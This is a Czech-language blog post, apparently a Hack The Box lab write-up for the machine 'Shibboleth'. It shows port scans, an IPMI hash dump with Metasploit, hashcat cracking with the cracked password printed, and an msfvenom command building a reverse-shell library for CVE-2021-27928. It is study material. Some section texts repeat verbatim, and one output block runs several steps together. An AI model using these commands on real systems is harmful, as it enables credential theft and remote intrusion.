---
layout: post
author: Tomáš Matějíček
title: "Shibboleth"
date: 2021-01-16
tags: linux rce exploit enumeration privesc hackthebox
---

## Úvod a kontext

Shibboleth je stroj z Hack The Box. Článek sleduje cestu od prvotní enumerace k ověřenému přístupu a průběžně vysvětluje, proč měl každý další krok technický smysl.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
```
```
PORT      STATE  SERVICE VERSION
80/tcp    open   http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://shibboleth.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

### Vyhledání otevřených portů (2)

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
nmap -sU --min-rate 5000 --max-retries 1 -p- --open $IP
```
```
PORT    STATE SERVICE
623/udp open  asf-rmcp
```

## Analýza zjištění

### Lámání hesel nebo hashů

Hash nebo zašifrovaný artefakt má smysl lámat jen tehdy, pokud může otevřít další službu, účet nebo vrstvu prostředí; právě to zde ověřuji.
```bash
hashcat --force -m 7300 -a 0 "__CENSORED__:__CENSORED__" /usr/share/wordlists/rockyou.txt
```
```
=> ilovepumkinpie1
```

## Získání přístupu

### Spuštění exploitu

V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
```text
msfconsole
```
```
use scanner/ipmi/ipmi_dumphashes
set RHOST 10.10.11.124

[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:__CENSORED__:__CENSORED__
```

### Získání user flagu

User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
```bash
cat user.txt
```
```
__CENSORED__

## /etc/zabbix/zabbix_server.conf
DBHost=localhost
DBName=zabbix
DBUser=zabbix
DBPassword=__CENSORED__

## CVE-2021-27928
```

### Spuštění exploitu (2)

V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
```text
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4001 -f elf-so -o CVE-2021-27928.so
```

## Eskalace oprávnění

### Získání root flagu

Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
```bash
cat /root/root.txt
```
```
__CENSORED__
```

## Shrnutí klíčových poznatků

- Úvodní sken služeb vymezil reálnou útočnou plochu a pomohl oddělit relevantní stopy od šumu.
- K uživatelskému přístupu vedla práce s nalezenými přihlašovacími údaji, klíči nebo hashi a jejich ověření proti reálně dostupné službě.
- Finální část ukazuje, že po získání shellu je nutné systematicky hledat slabé delegace oprávnění, uložená tajemství a automatizované procesy.

## Co si odnést do praxe

- Přístupové údaje je potřeba oddělovat mezi službami a minimalizovat jejich opětovné použití, jinak se z jedné slabiny rychle stane plnohodnotný vstup do systému.
- Inventura verzí a včasné záplatování snižují prostor pro přímé zneužití známých chyb i pro slepé spoléhání na zastaralé komponenty.
- Stejné techniky mají smysl pouze v laboratorním nebo jinak autorizovaném testovacím prostředí.
